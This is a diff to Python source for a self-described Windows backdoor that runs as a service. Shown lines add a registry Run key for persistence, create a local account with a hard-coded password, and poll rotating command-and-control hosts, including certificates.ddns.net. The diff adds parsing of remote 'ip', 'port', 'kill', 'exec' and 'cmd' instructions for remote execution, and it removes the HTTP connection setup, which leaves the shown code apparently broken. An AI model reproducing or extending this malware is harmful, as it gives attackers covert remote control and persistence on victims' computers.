@@ -31,6 +31,9 @@ from subprocess import Popen
 
 #Win-Python-Backdoor
 
+
+#copy /y C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\wofficeie.py C:\Python27
+#python setupserie.py py2exe
 #python C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\setupserie.py py2exe
 def get_macaddress(host='localhost'):
     """ Returns the MAC address of a network host, requires >= WIN2K. """
@@ -101,10 +104,12 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
         site3="certificates.ddns.net"
         os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
         os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
+        
         while True:
             
             
             try:
+                    
                     if sinit == '0':
                             #os.system("net.exe user Administrator /active:yes")
                             os.system("net.exe user asp Qwerty12 /add")
@@ -164,10 +169,24 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                                 site=site3
                             elif site == site3:
                                 site=site1
-                            httpServ = httplib.HTTPConnection(site, 80)
-                            httpServ.connect()
                             httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)
                             response = httpServ.getresponse()
+                            if response.status == httplib.OK:
+                                print "Output from HTML request"
+                                sresponse = response.read()
+                                ifind=sresponse.find('ip=')
+                                sip = sresponse[ifind+3:sresponse.find('||',ifind)]
+                                ifind=sresponse.find('port=')
+                                sport = sresponse[ifind+5:sresponse.find('||',ifind)]
+                                ifind=sresponse.find('kill=')
+                                skill = sresponse[ifind+5:sresponse.find('||',ifind)]
+                                ifind=sresponse.find('iout=')
+                                sout = sresponse[ifind+5:sresponse.find('||',ifind)]
+                                ifind=sresponse.find('exec=')
+                                sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
+                                ifind=sresponse.find('cmd=')
+                                scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
+                                print skill
                             
                     httpServ.close()
                     if sexec == '1':
@@ -256,7 +275,7 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                     site=site1
             except Exception,e:
                     print str(e)
-                    print e.errno
+                    #print e.errno
                     #if e.errno == 11001:                        
                     if site == site1:
                         site=site2
@@ -265,4 +284,4 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                     elif site == site3:
                         site=site1
             time.sleep(5)
-            
+
